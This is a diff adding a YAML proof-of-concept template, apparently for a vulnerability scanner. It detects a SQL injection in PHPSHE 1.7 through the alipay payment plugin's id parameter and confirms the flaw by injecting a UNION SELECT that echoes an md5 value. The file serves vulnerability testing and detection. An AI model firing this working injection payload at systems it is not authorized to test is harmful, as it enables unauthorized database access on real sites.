@@ -1,0 +1,13 @@
+name: poc-yaml-phpshe-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,CONCAT%28md5({{rand}})%29,4,5,6,7,8,9,10,11,12%23_
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: hhdaddy
+  Affected Version: "1.7"
+  links:
+    - https://www.cnblogs.com/Spec/p/10718046.html
